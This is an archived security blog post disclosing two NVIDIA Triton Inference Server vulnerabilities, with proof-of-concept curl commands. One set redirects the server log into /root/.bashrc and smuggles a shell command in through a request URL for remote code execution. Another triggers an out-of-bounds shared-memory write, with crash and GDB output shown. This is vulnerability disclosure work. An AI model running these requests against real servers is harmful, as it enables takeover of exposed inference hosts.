---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-19_preauth-rce-on-nvidia-triton-server.md
original_filename: 2024-06-19_preauth-rce-on-nvidia-triton-server.md
title: Preauth RCE on NVIDIA Triton Server
category: documents
detected_topics:
- command-injection
- sso
- api-security
- mobile-security
- supply-chain
tags:
- imported
- documents
- command-injection
- sso
- api-security
- mobile-security
- supply-chain
language: en
raw_sha256: 5cdd3135d3abfc4187dbeceb145de605d33f5d1265c893095cef5a5ce1985d1b
text_sha256: a6febcb97544a19855455b83927c9b04e3cd44a9a50bf17e8198bcfaeafdab68
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Preauth RCE on NVIDIA Triton Server

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-19_preauth-rce-on-nvidia-triton-server.md
- Source Type: markdown
- Detected Topics: command-injection, sso, api-security, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `5cdd3135d3abfc4187dbeceb145de605d33f5d1265c893095cef5a5ce1985d1b`
- Text SHA256: `a6febcb97544a19855455b83927c9b04e3cd44a9a50bf17e8198bcfaeafdab68`


## Content

---
title: "Preauth RCE on NVIDIA Triton Server"
url: "https://sites.google.com/site/zhiniangpeng/blogs/Triton-RCE"
final_url: "https://sites.google.com/site/zhiniangpeng/blogs/Triton-RCE"
authors: ["zhiniang peng (@edwardzpeng)"]
programs: ["Nvidia"]
bugs: ["AI", "RCE", "Arbitrary file write", "Memory corruption"]
publication_date: "2024-06-19"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 239
---

Search this site

Embedded Files

Skip to main content

Skip to navigation

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

  * More

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

# Preauth RCE on NVIDIA Triton Server

## Background

  

Triton Inference Server (https://github.com/triton-inference-server/) is an open-source software released by NVIDIA and is an important part of the NVIDIA AI platform. This server can standardize the deployment and execution of AI models for various workloads, providing users with fast and scalable AI services. As a mainstream global AI inference server, Triton is widely used by many artificial intelligence manufacturers around the world.

  

Recently, we discovered and reported two vulnerabilities on NVIDIA's Triton Server:

  

- **CVE-2024-0087**: Arbitrary file write through Triton Server's log configuration interface leading to remote code execution.

- **CVE-2024-0088**: Inadequate parameter validation in Triton Server's shared memory handling leading to arbitrary address write.

  
  

## CVE-2024-0087

  

The log file configuration interface, `/v2/logging`, accepts a `log_file` parameter, allowing setting an absolute path for the log file to be written.

  

This facilitates arbitrary file creation, writing, or appending. An attacker can exploit this by writing to files such as `/root/.bashrc`, `/etc/environment`, or by injecting malicious shell scripts into any user model business-related script file, which will then be executed on the Triton Server. The attacker can wait for the script containing the malicious command to be executed after being written.

  
  

### POC

  

'''python

# Start the Triton Server service and wait for it to be ready on port 8000.

...

  

# Specify the file to be appended or overwritten, e.g., /root/.bashrc

curl http://127.0.0.1:8000/v2/logging -X POST -d '{"log_file":"/root/.bashrc","log_info":true,"log_warning":true,"log_error":true,"log_verbose_level":1,"log_format":"default"}' -v

  

# Write the attack command through log access

curl 'http://127.0.0.1:8000/cmd/`id>/root/cmd_result`' -v

  

# Simulate the execution of the script containing the attack command

bash

  

# Confirm the execution of the injected command

tail /root/.bashrc

ls -l /root/cmd_result && cat /root/cmd_result

'''

  

## CVE-2024-0088

  

Triton Server may be deployed through Kubernetes. To expedite the process of parameter passing between clients and servers within different Docker containers on the same machine, it allows clients to register shared memory and specify the shared memory addresses for input parameters and output results using the `shared_memory_offset` and `shared_memory_byte_size` parameters. More details can be found in the documentation [here](https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/protocol/extension_shared_memory.html). The lack of validation for these parameters can lead to arbitrary address writing through the output result process. In certain scenarios, depending on the inference model's output and the type of output parameters, this may also enable the leakage of memory data.

  

### POC

  

Start the Triton Server and wait for the service on port 8000 to be ready. Set up a Python backend model (using the add_sub model as an example) following the quick deployment steps in the [documentation](https://github.com/triton-inference-server/python_backend?tab=readme-ov-file#quick-start).

  

'''bash

# Request the shared memory registration interface.

curl http://127.0.0.1:8000/v2/systemsharedmemory/region/sec_test/register -X POST -d '{"key":"triton_python_backend_shm_region_2", "offset":0, "byte_size":67108864}'

  

# Request an inference, setting the address offset to be written. To demonstrate the effect of causing the program to crash, set the offset to 18446744073709551584, which is -0x20 in int64_t. At this offset, the output address calculation results in an illegal address, typically 32 bytes before the start of shared memory. This is expected to cause a segmentation fault (SIGSEGV).

curl http://127.0.0.1:8000/v2/models/add_sub/infer -X POST -d '{"id":"1","inputs":[{"name":"INPUT0","shape":[4],"datatype":"FP32","parameters":{"shared_memory_region":"sec_test","shared_memory_offset":0,"shared_memory_byte_size":64}},{"name":"INPUT1","shape":[4],"datatype":"FP32","parameters":{"shared_memory_region":"sec_test","shared_memory_offset":0,"shared_memory_byte_size":64}}],"outputs":[{"name":"OUTPUT0","parameters":{"shared_memory_region":"sec_test","shared_memory_offset":18446744073709551584,"shared_memory_byte_size":64}},{"name":"OUTPUT1","parameters":{"binary_data":true}}]}'

'''

  

Check the program's command line and GDB's exception information to confirm that the written address is at the location -0x20 from the start of shared memory.

  

'''python

Signal (11) received.

0# 0x0000555555692959 in tritonserver

1# 0x00007FFFF648D090 in /lib/x86_64-linux-gnu/libc.so.6

2# 0x00007FFFF65D598C in /lib/x86_64-linux-gnu/libc.so.6

3# 0x00007FFFD519471B in /opt/tritonserver/backends/python/libtriton_python.so

4# 0x00007FFFD517A430 in /opt/tritonserver/backends/python/libtriton_python.so

5# 0x00007FFFD514259D in /opt/tritonserver/backends/python/libtriton_python.so

6# TRITONBACKEND_ModelInstanceExecute in /opt/tritonserver/backends/python/libtriton_python.so

7# 0x00007FFFF6E25054 in /opt/tritonserver/bin/../lib/libtritonserver.so

8# 0x00007FFFF6E25347 in /opt/tritonserver/bin/../lib/libtritonserver.so

9# 0x00007FFFF6F192A1 in /opt/tritonserver/bin/../lib/libtritonserver.so

10# 0x00007FFFF6E24327 in /opt/tritonserver/bin/../lib/libtritonserver.so

11# 0x00007FFFF687EDE4 in /lib/x86_64-linux-gnu/libstdc++.so.6

12# 0x00007FFFF6992609 in /lib/x86_64-linux-gnu/libpthread.so.0

13# clone in /lib/x86_64-linux-gnu/libc.so.6

  

# Upon examining the process using GDB, it was observed that the process triggered a SIGSEGV (Segmentation Fault) when accessing the address 0x7ffefbffffe0. It was confirmed that this corresponds to the location obtained by subtracting 0x20 from the shared memory address 0x7ffefc000000.

  

gef➤ i proc mappings | grep shm

Too many parameters: | grep shm

gef➤ shell cat /proc/`pidof tritonserver`/maps | grep shm

7ffefc000000-7fff00000000 rw-s 00000000 00:2e 13971966 /dev/shm/triton_python_backend_shm_region_2

7fffca53f000-7fffce53f000 rw-s 00000000 00:2e 13971966 /dev/shm/triton_python_backend_shm_region_2

gef➤ bt 20

#0 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:306

#1 0x00007fffd519471b in triton::backend::CopyBuffer(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, TRITONSERVER_memorytype_enum, long, TRITONSERVER_memorytype_enum, long, unsigned long, void const*, void*, CUstream_st*, bool*, bool) () from /opt/tritonserver/backends/python/libtriton_python.so

#2 0x00007fffd517a430 in triton::backend::python::InferResponse::Send(TRITONBACKEND_ResponseFactory*, void*, bool&, unsigned int, std::unique_ptr<triton::backend::python::SharedMemoryManager, std::default_delete<triton::backend::python::SharedMemoryManager> >&, std::vector<std::pair<std::unique_ptr<triton::backend::python::PbMemory, std::default_delete<triton::backend::python::PbMemory> >, void*>, std::allocator<std::pair<std::unique_ptr<triton::backend::python::PbMemory, std::default_delete<triton::backend::python::PbMemory> >, void*> > >&, std::set<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::less<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > >, std::allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > > const&, TRITONBACKEND_Response*) () from /opt/tritonserver/backends/python/libtriton_python.so

#3 0x00007fffd514259d in triton::backend::python::ModelInstanceState::ProcessRequests(TRITONBACKEND_Request**, unsigned int, bool&) () from /opt/tritonserver/backends/python/libtriton_python.so

#4 0x00007fffd514352a in TRITONBACKEND_ModelInstanceExecute () from /opt/tritonserver/backends/python/libtriton_python.so

#5 0x00007ffff6e25054 in triton::core::TritonModelInstance::Execute(std::vector<TRITONBACKEND_Request*, std::allocator<TRITONBACKEND_Request*> >&) () from /opt/tritonserver/bin/../lib/libtritonserver.so

#6 0x00007ffff6e25347 in triton::core::TritonModelInstance::Schedule(std::vector<std::unique_ptr<triton::core::InferenceRequest, std::default_delete<triton::core::Inference

  

Request> > >&&, std::function<void ()> const&) () from /opt/tritonserver/bin/../lib/libtritonserver.so

#7 0x00007ffff6f192a1 in triton::core::Payload::Execute(bool*) () from /opt/tritonserver/bin/../lib/libtritonserver.so

#8 0x00007ffff6e24327 in triton::core::TritonModelInstance::TritonBackendThread::BackendThread(int, int) () from /opt/tritonserver/bin/../lib/libtritonserver.so

#9 0x00007ffff687ede4 in ?? () from /lib/x86_64-linux-gnu/libstdc++.so.6

#10 0x00007ffff6992609 in start_thread (arg=<optimized out>) at pthread_create.c:477

#11 0x00007ffff6569353 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95

gef➤ x/i $rip

=> 0x7ffff65d598c <__memmove_avx_unaligned_erms+124>: vmovdqu XMMWORD PTR [rdi],xmm0

gef➤ i r rdi

rdi 0x7ffefbffffe0 0x7ffefbffffe0

gef➤ p 0x7ffefc000000-0x20

$1 = 0x7ffefbffffe0

gef➤

'''

  

An interesting point is that the memory address mapped by the shared memory `triton_python_backend_shm_region_2` is adjacent to the `libz` library.

  

## Impact and Thoughts

  

The application of AI is becoming increasingly widespread, permeating every aspect of people's work and life. Along with this comes the issue of AI security. Is the AI assistant we use every day trustworthy? Is the AI server that the core business of a company depends on secure? The security of AI has become a complex and multifaceted issue.

  

The NVIDIA AI platform's applications and functionalities are widely supported by the Triton Inference Server, which underscores the server's critical role in the infrastructure of AI operation. If vulnerabilities in this blog is exploited by malicious attackers, companies and manufacturers using the triton server could face the risk of complete control over their cloud-based AI models. Unauthorized attackers could steal sensitive user data, execute malicious code, alter AI model computation results, and even steal AI models, posing catastrophic risks to user privacy and devastating losses to corporate interests and brand reputation.

  

For instance, if an autonomous vehicle manufacturer uses the Triton Inference Server to provide self-driving AI service, exploitation of this vulnerability could lead to misjudgments, endangering the safety of passengers and pedestrians. Furthermore, if an AI service provider uses the Triton Inference Server for deploying AI models, an intrusion exploiting this vulnerability could result in the tampering of model computation results or even direct theft of the AI model, leading to intellectual property leakage or reputational damage.

  

For a customer using AI, as your "AI assistant" could potentially betray you with all your privacy and data at risk. If a conversational AI assistant you've been using is controlled by hackers exploiting this vulnerability, all your conversation content, daily habits, and private information could be exposed. Hackers could disclose and sell your personal information or use it to commit fraud, steal property, or engage in other illegal activities.

  

The rapid development of AI technology has indeed brought about tremendous changes and conveniences, but the current state of AI security is still fragile. We call for greater attention to AI security within the industry.

  

## Credits

Lawliet & Zhiniang Peng (@edwardzpeng)

  

Google Sites

Report abuse

Google Sites

Report abuse
